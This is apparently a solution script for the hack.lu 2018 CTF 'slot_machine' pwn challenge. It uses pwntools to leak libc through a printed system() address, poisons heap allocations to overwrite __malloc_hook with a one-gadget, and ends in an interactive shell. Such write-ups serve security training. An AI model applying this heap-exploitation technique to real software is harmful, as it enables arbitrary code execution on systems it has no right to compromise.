#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools

IP = "arcade.fluxfingers.net"
PORT = 1815
# IP = "192.168.33.1"
# PORT = 9999

context.arch = "amd64"
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
BIN = "./slot_machine"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()

io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    context.noptrace = True
    io = remote(IP, PORT)  
    libc = ELF("./libc.so.6")
elif args.local or args.debugger:
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    # env = {}
    io = process(BIN, env=env)
    print io.libs()
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/hack.lu2018/pwn/slot_machine/public/slot_machine"]
    libc_bb = io.libs()[
        '/home/vagrant/DongFeng/hack.lu2018/pwn/slot_machine/public/libc.so.6']
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc = ELF("./libc.so.6")
else:
    parser.print_help()
    exit()



def malloc_heap(size):
    rud("[ 4 ] : bye!")
    sel(str(1))
    rud("How much?")
    sel(str(size))


def free_heap(index):
    rud("[ 4 ] : bye!")
    sel(str(2))
    rud("where?")
    sel(str(index))

def write_heap(payload):
    rud("[ 4 ] : bye!")
    sel(str(3))
    rud("what?")
    if len(payload) > 8:
        log.critical("May be your PAYLOAD too long!!!!!!")
    se(payload)


if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    c
    '''.format(
        proc_base + 0x00000000000013B8,  # malloc
        proc_base + 0x00000000000013EE,  # free
        proc_base + 0x00000000000001424,  # write
        libc_bb + 0xe75f0, #one gadget
        )
    )

ru("Here is system : ")
system_addr = int(rud("\n").strip(), 16)
libc.address = system_addr - libc.symbols["system"]
log.critical("libc.address: 0x%x" % libc.address)

new_malloc_hook = libc.symbols["__malloc_hook"] # - 0x20 + 0x5 - 0x8
log.critical("new_malloc_hook address for fastbin attack: 0x%x" % new_malloc_hook)

# 可用解法，但需要9步
# malloc_heap(0x10)
# free_heap(0)
# free_heap(0)
# malloc_heap(0x10)
# write_heap(p64(new_free_hook))
# malloc_heap(0x10)
# malloc_heap(0x10)

malloc_heap(0x3a0)
free_heap(0)
free_heap(-0x260+0x50)
malloc_heap(0x100-0x10)
write_heap(p64(new_malloc_hook))
malloc_heap(0x10)


one_gg = 0xe75f0 + libc.address
log.critical("one gadget address: 0x%x" % one_gg)
one_gg = p64(one_gg)

content = one_gg
write_heap(content)

malloc_heap(0x10)

io.interactive()
